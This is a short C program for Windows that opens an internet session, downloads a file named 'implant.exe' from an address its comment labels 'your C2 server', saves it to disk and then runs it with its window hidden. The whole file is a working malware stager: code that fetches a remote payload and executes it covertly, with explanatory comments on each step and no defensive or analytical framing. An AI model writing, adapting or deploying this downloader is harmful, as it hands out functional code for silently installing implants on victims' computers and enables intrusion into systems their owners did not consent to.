#include <stdio.h>

#include <windows.h>
#include <wininet.h>

int main(void)
{
    // 1. Open an internet session
    HINTERNET hInternet = InternetOpen(
        "Mozilla/5.0",             // user agent
        INTERNET_OPEN_TYPE_DIRECT, // no proxy
        NULL,                      // proxy name (unused)
        NULL,                      // proxy bypass (unused)
        0                          // flags
    );

    // 2. Open the URL
    HINTERNET hUrl = InternetOpenUrl(
        hInternet,
        "http://192.168.1.10:8080/implant.exe", // your C2 server
        NULL,                                   // no extra headers
        0,                                      // headers length
        INTERNET_FLAG_RELOAD,                   // don't cache, always fetch fresh
        0                                       // context (unused)
    );

    // 3. Write the response to disk
    char buf[4096];
    DWORD bytesRead;
    FILE *f = fopen("implant.exe", "wb"); // wb = write binary
    while (InternetReadFile(hUrl, buf, sizeof(buf), &bytesRead) && bytesRead > 0)
    {
        fwrite(buf, 1, bytesRead, f);
    }
    fclose(f);

    // 4. Clean up handles
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    // 5. Execute the implant, hidden
    WinExec("implant.exe", SW_HIDE);
    return 0;
}
